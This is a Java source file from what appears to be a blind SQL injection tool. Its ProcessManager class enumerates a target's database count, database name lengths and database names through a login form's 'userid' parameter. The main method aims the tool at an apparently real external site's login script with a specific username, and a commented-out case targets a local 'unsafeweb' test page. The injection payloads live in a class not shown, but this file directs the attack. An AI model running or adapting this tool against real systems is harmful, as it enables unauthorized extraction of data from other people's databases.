/**
 * @ ProcessManager.java
 */
package logic;

import java.util.ArrayList;
import java.util.List;

import domain.enumeration.DbmsType;
import domain.enumeration.HttpQueryType;
import logic.ResultResolver;

/**
 * <pre>
 * logic.sqlinjection
 * ProcessManager.java 
 * </pre>
 *
 * @brief	: Process Control Manager
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/08/16
 */
public class ProcessManager {

	private ResultResolver resultResolver;
	private String match;
	private String targetURL;
	private String targetParam;
	private String targetParamVal;
	
	
	public String getTargetParamVal() {
		return targetParamVal;
	}

	public void setTargetParamVal(String targetParamVal) {
		this.targetParamVal = targetParamVal;
	}

	public String getTargetParam() {
		return targetParam;
	}

	public void setTargetParam(String targetParam) {
		this.targetParam = targetParam;
	}

	public String getTargetURL() {
		return targetURL;
	}

	public void setTargetURL(String targetURL) {
		this.targetURL = targetURL;
	}

	public String getMatch() {
		return match;
	}

	public void setMatch(String match) {
		this.match = match;
	}
	
	public ProcessManager() {
		resultResolver = new ResultResolver();
	}
	
	public int getDBCount(DbmsType dbmsType, HttpQueryType httpQueryType){
		return resultResolver.getDBCount(targetURL, match, 20, targetParam, targetParamVal, dbmsType, httpQueryType);
	}
	
	
	public List<Integer> getDBNameLength(int dbCnt, DbmsType dbmsType, HttpQueryType httpQueryType){
		List<Integer> dbLengths = new ArrayList<Integer>();
		for (int i=0; i < dbCnt; i++){
			dbLengths.add(resultResolver.getDBNameLength(targetURL, match, i, 40, targetParam, targetParamVal, dbmsType, httpQueryType));
		}
		// show data
		for (int i=0; i < dbLengths.size(); i++){
			System.out.println((i+1) + "'th db name length :" + dbLengths.get(i));
		}	
		return dbLengths;
	}
	
	
	public List<String> getDBNames(int dbCnt, List<Integer> dbLengths,DbmsType dbmsType, HttpQueryType httpQueryType){
		List<String> dbNames = new ArrayList<String>();
		for (int i=0; i < dbCnt; i++){
			dbNames.add(resultResolver.getDBName(targetURL, match, i, dbLengths.get(i), targetParam, targetParamVal, dbmsType, httpQueryType));
		}
		// show data
		for (int i=0; i < dbNames.size(); i++){
			System.out.println((i+1) + "번 째 DB의 이름:" + dbNames.get(i));
		}
		return dbNames;
	}
	
	/*
	public String getDBName(int targetDBIndex, int targetDBLength){
		return resultResolver.getDBName(targetURL, match, targetDBIndex, targetDBLength, targetParam);
	}
	
	public int getTableCount(String dbName){
		return resultResolver.getTableCount(targetURL, match, dbName, 50, targetParam);
	}*/


	public static void main(String[] args) {
		/* case 1 : 내 로컬 테스트 */
		/*
		String targetURL = "http://localhost:8088/unsafeweb/loginProcess.jsp";
		ProcessManager processManager = new ProcessManager();
		processManager.setTargetURL(targetURL);
		processManager.setTargetParam("userid");
		processManager.setTargetParamVal("admin");
		processManager.setMatch("실패하였습니다"); //false search
		 
		// TEST STEP 1. DB Count
		int dbCnt = processManager.getDBCount();
		System.out.println("DB Cnt is...: " + dbCnt); //10
		
		// TEST STEP 2. DB Name's length
		List<Integer> dbLengths = processManager.getDBNameLength(dbCnt);
		
		// TEST STEP 3. DB Name
		List<String> dbNames = processManager.getDBNames(dbCnt, dbLengths);
		
		// TEST STEP 4. Table Count
		String targetDB = "PHPWEB";
		//SysteprocessManager.out.println(targetDB + " Table cnt :" + processManager.getTableCount(targetDB));
		
		// TEST STEP 5. Table Length
		*/
		
		// Case 2
		String targetURL = "http://dev.ifacsoft.com//module/loginPrc.php";
		ProcessManager processManager = new ProcessManager();
		processManager.setTargetURL(targetURL);
		processManager.setTargetParam("userid");
		processManager.setTargetParamVal("jack4928");
		processManager.setMatch("_ok"); //false search
		 
		// TEST STEP 1. DB Count
		//int dbCnt = processManager.getDBCount(DbmsType.MS_SQL, HttpQueryType.POST_QUERY_ON_PARAM);
		//System.out.println("DB Cnt is...: " + dbCnt); 
		
		
		// TEST STEP 2. DB Name's length
		int dbCnt = 1;
		//List<Integer> dbLengths = processManager.getDBNameLength(dbCnt, DbmsType.MS_SQL, HttpQueryType.POST_QUERY_ON_PARAM);
		List<Integer> dbLengths = new ArrayList<Integer>();
		dbLengths.add(6);
		
		
		// TEST STEP 3. DB Name
		List<String> dbNames = processManager.getDBNames(dbCnt, dbLengths,DbmsType.MS_SQL, HttpQueryType.POST_QUERY_ON_PARAM);
		/*
		// TEST STEP 4. Table Count
		String targetDB = "PHPWEB";
		//SysteprocessManager.out.println(targetDB + " Table cnt :" + processManager.getTableCount(targetDB));
		*/
		// TEST STEP 5. Table Length
	}
}
